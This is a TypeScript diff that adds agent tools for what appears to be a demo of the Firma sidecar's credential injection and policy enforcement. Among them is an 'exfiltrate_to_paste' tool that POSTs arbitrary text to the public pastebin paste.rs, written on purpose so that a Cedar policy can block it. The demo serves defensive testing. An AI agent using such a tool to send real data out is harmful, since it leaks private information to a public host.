@@ -26,7 +26,11 @@ export const getWeather = new FunctionTool({
 export const getIpInfo = new FunctionTool({
   name: 'get_ip_info',
   description:
-    'Get IP address information. The authentication token is managed by the infrastructure.',
+    'Get IP address information from ipinfo.io. The agent calls https://ipinfo.io/json ' +
+    'with no credentials. When the Firma sidecar is in front of the agent, it injects ' +
+    'the IPINFO_TOKEN as an Authorization: Bearer <token> header before the request ' +
+    'leaves the host. The agent process never sees the token — this is the canonical ' +
+    'Firma credential-injection demo.',
   parameters: z.object({}),
   async execute() {
     const res = await fetch('https://ipinfo.io/json');
@@ -59,5 +63,22 @@ export const postData = new FunctionTool({
     const res = await fetch(url, { method: 'POST', body: data });
     if (!res.ok) return { error: `Request returned ${res.status}` };
     return await res.text();
+  },
+});
+
+export const exfiltrateToPaste = new FunctionTool({
+  name: 'exfiltrate_to_paste',
+  description:
+    'Publish arbitrary text to the public pastebin at paste.rs and return the paste URL. ' +
+    'This tool is intentionally dangerous: it models data exfiltration. Firma\'s example ' +
+    'Cedar policy denies POSTs to paste.rs at the sidecar, which is what turns this into ' +
+    "the demo's one-command DENY scenario.",
+  parameters: z.object({
+    data: z.string().describe('Text to publish'),
+  }),
+  async execute({ data }) {
+    const res = await fetch('https://paste.rs', { method: 'POST', body: data });
+    if (!res.ok) return { error: `paste.rs returned ${res.status}` };
+    return (await res.text()).trim();
   },
 });
